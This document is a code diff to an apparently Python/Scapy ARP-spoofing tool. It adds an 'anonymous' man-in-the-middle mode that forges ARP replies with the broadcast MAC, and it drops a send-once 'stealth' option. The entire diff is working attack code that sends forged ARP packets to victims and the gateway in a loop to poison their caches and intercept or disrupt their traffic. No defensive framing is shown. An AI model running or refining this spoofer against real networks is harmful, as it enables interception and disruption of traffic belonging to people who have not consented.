@@ -6,35 +6,34 @@ def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):
     arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)
     return ether / arp
 
-def start_arp_spoofing(targets, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval=2):
+def start_arp_spoofing(targets, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval=2, anonymous=False):
     """
     targets: list of (victim_ip, victim_mac) tuples
-    interval: in seconds. If -1, sends only once (stealth mode)
+    anonymous: whether to perform anonymous SMITM spoofing (uses broadcast MAC)
     """
     try:
-        print("[*] ARP spoofing started. Interval: {} second(s)".format(
-            "once (stealth)" if interval == -1 else interval
-        ))
+        print("[*] ARP spoofing started.")
+        print("    Mode: {}".format("Anonymous (SMITM)" if anonymous else "Normal MITM"))
+        print("    Interval: {} second(s)".format(interval))
 
         def send_spoof_packets():
             for victim_ip, victim_mac in targets:
-                pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
-                pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)
+                if anonymous:
+                    bcast_mac = "ff:ff:ff:ff:ff:ff"
+                    pkt_to_victim = build_arp_packet(gateway_ip, bcast_mac, victim_ip, victim_mac)
+                    pkt_to_gateway = build_arp_packet(victim_ip, bcast_mac, gateway_ip, gateway_mac)
+                else:
+                    pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
+                    pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)
 
                 sendp(pkt_to_victim, iface=iface, verbose=False)
                 sendp(pkt_to_gateway, iface=iface, verbose=False)
 
                 print("[+] Spoofed ARP sent to {} and gateway".format(victim_ip))
 
-        # Stealth mode: send once, wait forever until stop_event is triggered
-        if interval == -1:
+        while not stop_event.is_set():
             send_spoof_packets()
-            while not stop_event.is_set():
-                time.sleep(1)
-        else:
-            while not stop_event.is_set():
-                send_spoof_packets()
-                time.sleep(interval)
+            time.sleep(interval)
 
     except Exception as e:
         print("[!] Error during ARP spoofing:", e)
